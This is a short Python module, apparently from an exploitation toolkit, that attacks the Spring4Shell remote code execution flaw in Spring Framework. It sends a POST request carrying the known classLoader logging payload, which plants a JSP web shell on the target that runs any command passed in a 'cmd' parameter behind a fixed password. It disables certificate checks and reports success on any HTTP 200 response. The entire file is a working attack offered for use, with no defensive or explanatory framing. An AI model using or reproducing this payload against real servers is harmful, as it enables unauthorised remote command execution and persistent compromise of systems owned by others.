import requests
from core.printmodels import *

class Spring4Shell_RCE_Exploit:
    def __init__(self):
        self.name = "Spring4Shell RCE"
        self.description = "Spring Framework Remote Code Execution"
        self.author = "DrDataYE"

    def Exploit(self, site):
        try:
            endpoint = f"{site}/api"
            headers = {
                "suffix": "%>//",
                "c1": "Runtime",
                "c2": "<%",
                "DNT": "1",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
            
            response = requests.post(endpoint, headers=headers, data=data, verify=False, timeout=10)
            if response.status_code == 200:
                return PrintSuccess(f"[Spring4Shell] Potentially vulnerable!")
            return PrintFailed("[Spring4Shell] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Spring4Shell] Error: {str(e)}")
